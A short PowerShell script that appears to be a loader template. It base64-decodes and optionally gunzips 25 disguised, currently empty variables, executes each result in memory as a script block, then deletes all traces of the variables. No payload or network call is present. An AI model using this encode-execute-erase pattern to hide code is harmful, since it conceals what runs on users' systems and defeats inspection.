$Compromise = ""
$Generators = ""
$Repertoire = ""
$Reimbursed = ""
$Splintered = ""
$Norwegians = ""
$Compulsive = ""
$Geneticist = ""
$Replicates = ""
$Reinforces = ""
$Spoliation = ""
$Nottingham = ""
$Overturned = ""
$Concealing = ""
$Gentrified = ""
$Repression = ""
$Reinvested = ""
$Spotlights = ""
$Nouakchott = ""
$Overwrites = ""
$Carmichael = ""
$Nonpayment = ""
$Thrashings = ""
$Moderating = ""
$Groundless = ""

$Modules = @($Compromise,$Generators,$Repertoire,$Reimbursed,$Splintered,$Norwegians,$Compulsive,$Geneticist,$Replicates,$Reinforces,$Spoliation,$Nottingham,$Overturned,$Concealing,$Gentrified,$Repression,$Reinvested,$Spotlights,$Nouakchott,$Overwrites,$Carmichael,$Nonpayment,$Thrashings,$Moderating,$Groundless)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Compromise","Generators","Repertoire","Reimbursed","Splintered","Norwegians","Compulsive","Geneticist","Replicates","Reinforces","Spoliation","Nottingham","Overturned","Concealing","Gentrified","Repression","Reinvested","Spotlights","Nouakchott","Overwrites","Carmichael","Nonpayment","Thrashings","Moderating","Groundless") | ForEach-Object { Remove-Variable -Name $_ }
